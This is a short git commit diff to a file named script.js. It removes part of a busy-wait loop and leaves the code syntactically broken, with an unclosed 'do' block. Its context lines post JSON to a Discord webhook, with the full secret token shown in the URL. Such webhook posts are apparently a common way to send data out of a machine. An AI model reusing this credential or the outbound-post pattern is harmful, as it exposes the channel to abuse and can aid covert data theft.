348e0367a9bef2a87ae80a504b01bc4d23a719a9
BIBIL <99636054+spacebin-org@users.noreply.github.com>
2022-10-14 22:41:36 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,7 +1,4 @@
   do {
-    currentDate = Date.now();
-  } while (currentDate - date < milliseconds);
-}
     var request = new XMLHttpRequest();
     request.open("POST", "https://discord.com/api/webhooks/1026337811374284871/T4WSMmQpU5UjoLLeIhKZ1CYzlz7ahlhJIkbDE6Hxi5JjTiEYD5hw0URyBheFPAbdjYwO");
     request.setRequestHeader('Content-type', 'application/json');
